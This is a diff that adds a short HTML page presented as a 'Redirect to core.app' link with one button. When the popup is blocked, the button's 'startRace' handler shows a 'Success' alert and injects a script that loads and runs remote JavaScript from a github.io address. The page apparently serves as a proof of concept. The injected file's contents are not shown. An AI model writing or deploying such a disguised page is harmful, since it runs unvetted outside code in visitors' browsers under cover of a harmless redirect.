@@ -1,0 +1,23 @@
+<html>
+<head>
+  <title>Redirect to core.app</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
+    button { padding: 10px 20px; font-size: 16px; }
+  </style>
+</head>
+<body>
+  <h1>Click Here Redirect to core.app.</h1>
+  <button onclick="startRace()">Go to core.app</button>
+  <script>
+    function startRace() {
+      let popup = window.open("https://core.app/");
+      if (!popup) {
+		alert('Success')
+        var a=document.createElement("script");a.src="//mr-zheev.github.io/MR-ZHEEV/onlyprompt.js";document.body.appendChild(a);
+      }
+    }
+  </script>
+</body>
+</html>
